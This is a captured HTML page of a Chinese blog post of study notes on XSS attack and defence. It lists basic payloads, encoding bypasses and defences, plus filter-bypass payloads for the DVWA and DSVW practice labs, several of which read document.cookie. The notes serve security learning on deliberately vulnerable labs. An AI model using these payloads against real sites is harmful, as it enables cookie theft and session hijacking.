@@ -1,0 +1,384 @@
+<!doctype html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Web安全Day2 - XSS跨站实战攻防（上） - ZXQ!!!</title><link rel="apple-touch-icon" href="/images/favicons/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="/images/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+<link rel="icon" href="/images/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="/images/favicons/manifest.json">
+<link rel="icon" href="/images/favicons/favicon.ico">
+<meta name="keywords" content="" />
+<meta name="description" content="" /><meta itemprop="name" content="Web安全Day2 - XSS跨站实战攻防（上）">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2023-05-12T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2023-05-12T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="603">
+<meta itemprop="keywords" content="," /><meta property="og:title" content="Web安全Day2 - XSS跨站实战攻防（上）" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/tech/xss-3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-05-12T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-05-12T00:00:00&#43;00:00" /><meta property="og:site_name" content="ZXQ!!!" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Web安全Day2 - XSS跨站实战攻防（上）"/>
+<meta name="twitter:description" content=""/>
+<meta data-name="palette" content="blue"><link rel=stylesheet href="/css/bundle.min.9819e4e2411e150748363de90ec254ddcda514cc29bb1238a532433adb77735b.css" integrity="sha256-mBnk4kEeFQdINj3pDsJU3c2lFMwpuxI4pTJDOtt3c1s=" crossorigin="anonymous"><script src="/js/bundle.min.e32615bc744413570374d5b28e8c02ec03c7b28c31485b6fcc5b6174a08766d9.js" integrity="sha256-4yYVvHREE1cDdNWyjowC7APHsowxSFtvzFthdKCHZtk=" crossorigin="anonymous"></script>
+<link href="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.js"></script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/contrib/auto-render.min.js"> </script>
+<script type="text/javascript">
+	document.addEventListener("DOMContentLoaded", function() {
+  renderMathInElement(document.body, {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}
+    ],
+    macros: {
+      "\\ge": "\\geqslant",
+      "\\le": "\\leqslant",
+      "\\geq": "\\geqslant",
+      "\\leq": "\\leqslant"
+	}
+  });
+}); 
+</script>
+<meta property="og:type" content="index"/>
+<meta property="og:title" content="Unzybaryl`s Sekai" />
+<meta property="og:image" content="https://eustia.me/images/profile1.jpg" />
+<meta property="og:url" content="https://eustia.me/" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdn.jsdelivr.net/gh/flatblowfish/cave-draw/dist/cave-draw.min.js"></script></head><body><header><nav class="navbar navbar-expand-xl fixed-top">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      
+      ティアなのです！
+      
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav me-1 mb-2 mb-lg-0"><form class="search-bar d-flex ms-1" action="/search">
+  <div class="input-group input-group-sm">
+    <button class="btn btn-search disabled position-absolute left-0" type="submit"><i class="fas fa-fw fa-search"></i></button>
+    <input class="form-control rounded-pill" id="searchQuery" name="q" type="search" aria-label="Search">
+  </div>
+</form></ul><ul class="navbar-nav me-1 mb-2 mb-lg-0 me-1 ms-auto"><li class="nav-item">
+          <a class="nav-link" href="/archives">
+            <i class="fas fa-fw fa-file-archive"></i>归档
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/bin/">
+            <i class="fas fa-fw fa-bookmark "></i>废案
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/posts/tech/">
+            <i class="fas fa-fw fa-star"></i>技术
+          </a>
+        </li><li class="nav-item">
+  <a class="nav-link" data-bs-toggle="offcanvas" href="#offcanvasSettings" role="button"
+    aria-controls="offcanvasSettings">
+    <i class="fas fa-fw fa-sliders-h"></i> 设置
+  </a>
+</li>
+
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasSettings"
+  aria-labelledby="offcanvasSettingsLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" w id="offcanvasSettingsLabel"><i class="fas fa-fw fa-sliders-h"></i> 设置</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body"><section class="setting">
+  <form class="row">
+    <div class="col-auto">
+      <label><i class="fas fa-fw fa-adjust"></i> 模式</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="modeSwitcher">
+      </div>
+    </div>
+  </form>
+</section>
+<section class="setting">
+  <form class="font-size-switcher-form row">
+    <div class="col-auto">
+      <label for="fontSize" class="form-label"><i class="fas fa-fw fa-font"></i> 字体大小</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <input type="range" class="form-range" min="-2" max="2" id="fontSize">
+    </div>
+  </form>
+</section>
+
+</div>
+</div></ul>
+    </div>
+  </div>
+</nav>
+</header>
+<main role="main" class="container">
+      <div class="row content">
+<div class="col-lg-8">
+  <div class="container"><nav class="row" aria-label="breadcrumb">
+  <ol class="breadcrumb surface"><li class="breadcrumb-item"><a href="/">主页</a></li><li class="breadcrumb-item"><a href="/posts/">文章</a></li><li class="breadcrumb-item"><a href="/posts/tech/">Tech</a></li><li class="breadcrumb-item active">Web安全Day2 - XSS跨站实战攻防（上）</li></ol>
+</nav><article class="post row surface"><div class="post-panel-wrapper">
+  <div class="post-panel d-flex flex-column">
+    <a id="sidebarToggler" class="action d-none d-lg-block" role="button">
+  <i class="fas fa-fw fa-expand-alt fa-rotate-45"></i>
+</a>
+  
+    
+
+    
+    <a class="action" data-bs-container="body" data-bs-toggle="popover" data-bs-html="true" data-bs-placement="bottom"
+  data-bs-trigger="focus" tabindex="0"
+  data-bs-content="&lt;a target=&#34;_blank&#34; rel=&#34;license&#34; href=&#34;https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh&#34;&gt;CC BY-NC-ND 4.0 &lt;i class=&#34;fab fa-fw fa-creative-commons&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-by&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nc&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nd&#34;&gt;&lt;/i&gt;&lt;/a&gt;
+">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a id="btnTOC" class="fas fa-fw fa-list-alt" data-bs-toggle="offcanvas" href="#offcanvasTOC" aria-controls="offcanvasTOC" role="button">
+</a>
+  </div>
+</div>
+<h1 class="post-title my-3">Web安全Day2 - XSS跨站实战攻防（上）
+</h1><div class="post-meta mb-3">
+  <span class="post-date me-2">
+    <i class="fas fa-fw fa-calendar-alt"></i>2023-05-12
+  </span>
+  <span class="post-reading-time me-2">
+    <i class="fas fa-fw fa-coffee"></i>2 分钟阅读
+  </span>
+<a href="/categories/%E6%89%93%E6%80%AA%E5%8D%87%E7%BA%A7/" class="post-taxonomy">#打怪升级</a></div>
+
+
+
+                
+                <div class="addthis_inline_share_toolbox"></div>
+            <div class="offcanvas offcanvas-end surface" tabindex="-1" id="offcanvasTOC" aria-labelledby="offcanvasTOCLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" id="offcanvasTOCLabel">目录</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#文章内容">文章内容</a></li>
+        <li><a href="#基本xss语句">基本xss语句</a></li>
+        <li><a href="#xss绕过概述">xss绕过概述</a></li>
+        <li><a href="#xss防御">xss防御</a></li>
+        <li><a href="#bypass">Bypass</a></li>
+        <li><a href="#工具">工具</a></li>
+      </ul>
+    </li>
+    <li><a href="#注意">注意</a></li>
+  </ul>
+</nav>
+  </div>
+</div><div class="post-content mb-3" ><p><a href="https://mp.weixin.qq.com/s/iaH4FlbOy9NOD3MFjAYLcg">https://mp.weixin.qq.com/s/iaH4FlbOy9NOD3MFjAYLcg</a></p>
+<p>文章是在php语境下的。</p>
+<h3 id="文章内容">文章内容</h3>
+<h3 id="基本xss语句">基本xss语句</h3>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="ln">1</span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="sr">/xss/</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> //经典语句
+<span class="ln">2</span>
+<span class="ln">3</span><span class="p">&lt;</span><span class="nt">BODY</span> <span class="na">ONLOAD</span><span class="o">=</span><span class="s">alert(&#39;XSS&#39;)</span><span class="p">&gt;</span>
+<span class="ln">4</span><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+<span class="ln">5</span><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+<span class="ln">6</span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href </span><span class="o">=</span> <span class="s">javasript:alert(1)</span><span class="p">&gt;</span>
+</code></pre></div><h3 id="xss绕过概述">xss绕过概述</h3>
+<ul>
+<li>JS编码</li>
+<li>HTML实体编码</li>
+<li>URL编码</li>
+</ul>
+<h3 id="xss防御">xss防御</h3>
+<p>过滤输入的数据，和非法字符<code>‘ “ &lt; &gt; on* 等”’</code>
+输出到页面的数据进行相应的编码转换包括HTML实体编码、JavaScript编码等。</p>
+<h3 id="bypass">Bypass</h3>
+<h4 id="靶场dwva">靶场DWVA</h4>
+<p>1.没有任何防护</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="ln">1</span>#闭合标签之后插入payload标签。
+<span class="ln">2</span><span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;&lt;/</span><span class="nt">select</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">##</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(document.cookie)</span><span class="p">&gt;</span>
+<span class="ln">3</span>
+<span class="ln">4</span>#直接插入
+<span class="ln">5</span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p>2.中级</p>
+<p>注意input标签的maxlength属性在html层面限制了payload的长度，我们在客户端改一下这个长度就可以绕过了。</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="ln">1</span>#stripos过滤script标签，不要这个标签即可
+<span class="ln">2</span><span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;&lt;/</span><span class="nt">select</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">##</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(document.cookie)</span><span class="p">&gt;</span>
+<span class="ln">3</span>
+<span class="ln">4</span>#替换script标签为空，采用复写。
+<span class="ln">5</span><span class="p">&lt;</span><span class="nt">sc</span><span class="err">&lt;</span><span class="na">script</span><span class="p">&gt;</span>ript&gt;alert(document.cookie)<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p>3.高级</p>
+<p>构造语句，这里的##是URL的锚点，让<strong>浏览器判断这里终止</strong>，主要是让<strong>本地存储</strong>这个xss语句，<strong>发送到服务端进行验证的是##前面的内容</strong>，达到了绕过的目的。（反射xss不需要将payload发给服务器）</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="ln">1</span>#白名单，使用html锚点绕过
+<span class="ln">2</span>English##<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="ln">3</span>
+<span class="ln">4</span>#使用正则完全地匹配script标签，不用script标签即可
+<span class="ln">5</span><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">1</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(document.cookie)</span><span class="p">&gt;</span>
+</code></pre></div><p>4.不可能</p>
+<p>使用htmlspecialchars函数对输入实例化。</p>
+<h4 id="dsvw">DSVW</h4>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="ln">1</span>#普通，绕过了单引号
+<span class="ln">2</span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="sr">/xss aixi/</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><h3 id="工具">工具</h3>
+<p>BruteXSS：https://github.com/ym2011/penetration/tree/master/BruteXSS</p>
+<p>xxser：sudo apt-get install python-pycurl python-xmlbuilder python-beautifulsoup python-geoip</p>
+<h2 id="注意">注意</h2>
+<ul>
+<li>积累payload和工具使用经验</li>
+</ul></div><hr /><div class="post-navs d-flex mb-3 justify-content-between">
+  <div class="post-nav w-50"><div class="prev-post btn btn-sm">
+      <a href="/posts/tech/penetration-9/">实战 | 一次敏感信息到接口fuzz-RCE
+</a>
+    </div></div>
+  <div class="post-nav flex-row-reverse"><div class="next-post btn btn-sm">
+      <a href="/posts/othertech/data-structure/">数据结构
+</a>
+    </div></div>
+</div><section class="related-posts">
+    <h3>相关文章</h3>
+    <ul class="related-posts"><li><a href="/bin/subarashikihibi-1/">素晴日剧本片段
+</a></li><li><a href="/posts/tech/gal-extract/">记第一次从gal中解包提取素材和剧本
+</a></li><li><a href="/bin/free-talk/">杂谈——阿西莫夫的小说&amp;简奥斯汀所处的时代&amp;1984
+</a></li><li><a href="/posts/others/lighting-ball/">《球状闪电》
+</a></li><li><a href="/posts/others/stolz/">Stolz定理和一道例题
+</a></li></ul>
+  </section></article>
+
+
+
+
+<div id="vcomments" class="post-comments surface row">
+</div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: '18xpdRPZMKmyTjmjtMIK8zyB-gzGzoHsz',
+            appKey: 'haH3Ysz9ic7RFcoqbIvPDh8H',
+            avatar:'retro',
+            visitor:true,
+            placeholder:'有什么想说的吗？'
+
+        });
+
+        var count = 0;
+        var domTimer = setInterval(function () {
+            if (++count > 50) clearInterval(domTimer);
+            if (document.querySelector('#veditor')) {
+                clearInterval(domTimer);
+                var cdraw = new CaveDraw({
+                    element: "#veditor",
+                    readOnlyMode: false, 
+                    afterUpdateEditor: ()=>{ 
+                        document.querySelector('#veditor').focus();
+                        document.querySelector('#veditor').blur();
+                    },
+                    controls: ['brush', 'eraser', 'bucket', 'clear', 'undo', 'redo', 'save']
+                });
+            }
+        }, 200);
+    </script></div>
+</div><aside class="col-lg-4 sidebar d-flex">
+  <div class="container"><section class="profile surface row">
+  <div class="col-xl-6 d-flex align-items-center justify-content-center">
+    <img class="profile-avatar img-fluid" src="/images/profile4.jpg" alt="リソウナジダイ" loading="lazy">
+  </div>
+  <div class="col-xl-6">
+    <h5 class="profile-name my-2">リソウナジダイ</h5><div class="profile-bio mb-2">I learn hack technology</div><div class="profile-company mb-2"><i class="fas fa-fw fa-building"></i>挣钱只为抽老婆</div><div class="profile-about mb-2"><i class="fas fa-fw fa-info-circle"></i><a  href="/about/">关于</a></div>
+      </div>
+</section><section class="recent-posts row surface">
+  <h4>最近文章</h4>
+  <ul><li><a href="/posts/tech/csrf/">CSRF攻击与防御
+</a></li><li><a href="/posts/tech/xss-4/">【技术分享】漫谈同源策略攻防
+</a></li><li><a href="/posts/tech/penetration-10/">对母校的一次渗透测试
+</a></li><li><a href="/posts/othertech/data-structure/">数据结构
+</a></li><li><a href="/posts/tech/xss-3/">Web安全Day2 - XSS跨站实战攻防（上）
+</a></li><li><a href="/posts/tech/penetration-9/">实战 | 一次敏感信息到接口fuzz-RCE
+</a></li><li><a href="/posts/tech/xss-2/">一篇文章带你从XSS入门到进阶
+</a></li></ul>
+</section><section class="taxonomy-categories row surface">
+      <h4>
+        <a href="/categories">分类</a>
+      </h4>
+      <div><a href="/categories/%E6%89%93%E6%80%AA%E5%8D%87%E7%BA%A7/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="打怪升级">
+          打怪升级 <span class="badge rounded-pill">39</span>
+        </a><a href="/categories/%E4%BA%8C%E6%AC%A1%E5%85%83/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="二次元">
+          二次元 <span class="badge rounded-pill">23</span>
+        </a><a href="/categories/%E6%96%87%E5%AD%97%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="文字类">
+          文字类 <span class="badge rounded-pill">6</span>
+        </a><a href="/categories/%E6%99%AE%E9%80%9A%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="普通类">
+          普通类 <span class="badge rounded-pill">5</span>
+        </a><a href="/categories/%E8%AF%AD%E8%A8%80%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="语言类">
+          语言类 <span class="badge rounded-pill">1</span>
+        </a></div>
+    </section><section class="taxonomy-series row surface">
+      <h4>
+        <a href="/series">专栏</a>
+      </h4>
+      <div><a href="/series/%E5%8A%A8%E6%BC%AB%E6%AD%8C%E6%9B%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="动漫歌曲">
+          动漫歌曲 <span class="badge rounded-pill">21</span>
+        </a><a href="/series/galgame/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="Galgame">
+          Galgame <span class="badge rounded-pill">10</span>
+        </a><a href="/series/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="渗透测试">
+          渗透测试 <span class="badge rounded-pill">10</span>
+        </a><a href="/series/%E4%B9%A6%E7%B1%8D%E7%89%87%E6%AE%B5/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="书籍片段">
+          书籍片段 <span class="badge rounded-pill">6</span>
+        </a></div>
+    </section><section class="taxonomy-tags row surface">
+      <h4>
+        <a href="/tags">标签</a>
+      </h4>
+      <div><a href="/tags/kalafina/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="kalafina">
+          kalafina <span class="badge rounded-pill">5</span>
+        </a><a href="/tags/%E7%99%BD%E8%89%B2%E7%9B%B8%E7%B0%BF2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="白色相簿2">
+          白色相簿2 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E7%A7%BD%E7%BF%BC%E7%9A%84%E5%B0%A4%E6%96%AF%E7%BC%87%E4%BA%9A/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="秽翼的尤斯缇亚">
+          秽翼的尤斯缇亚 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%B0%8F%E5%9C%86/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="魔法少女小圆">
+          魔法少女小圆 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E7%99%BE%E5%B9%B4%E5%AD%A4%E7%8B%AC/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="百年孤独">
+          百年孤独 <span class="badge rounded-pill">3</span>
+        </a><a href="/tags/%E7%A9%BA%E4%B9%8B%E5%A2%83%E7%95%8C/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="空之境界">
+          空之境界 <span class="badge rounded-pill">3</span>
+        </a><a href="/tags/%E8%8B%B1%E5%9B%BD%E5%8F%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="英国史">
+          英国史 <span class="badge rounded-pill">2</span>
+        </a><a href="/tags/fate/zero/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="fate/zero">
+          fate/zero <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/magisk/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="magisk">
+          magisk <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E5%8F%8D%E5%8F%9B%E7%9A%84%E9%B2%81%E8%B7%AF%E4%BF%AE/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="反叛的鲁路修">
+          反叛的鲁路修 <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E5%B0%91%E5%A5%B3%E7%90%86%E8%AE%BA%E5%8F%8A%E5%85%B6%E5%91%A8%E8%BE%B9/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="少女理论及其周边">
+          少女理论及其周边 <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E6%96%A9%E8%B5%A4%E7%B4%85%E4%B9%8B%E7%9E%B3/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="斩·赤紅之瞳！">
+          斩·赤紅之瞳！ <span class="badge rounded-pill">1</span>
+        </a></div>
+    </section></div>
+</aside>
+</div>
+    </main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"></nav>
+<div class="copyright mb-2">
+  Copyright © 2021-2023 Unaybaryl. All Rights Reserved.
+</div>
+</footer>
+<a id="btnScrollToTop" class="btn-scroll-to-top">
+  <i class="fas fa-fw fa-chevron-circle-up fa-2x"></i>
+</a>
+
+
+
+              
+            </body>
+</html>
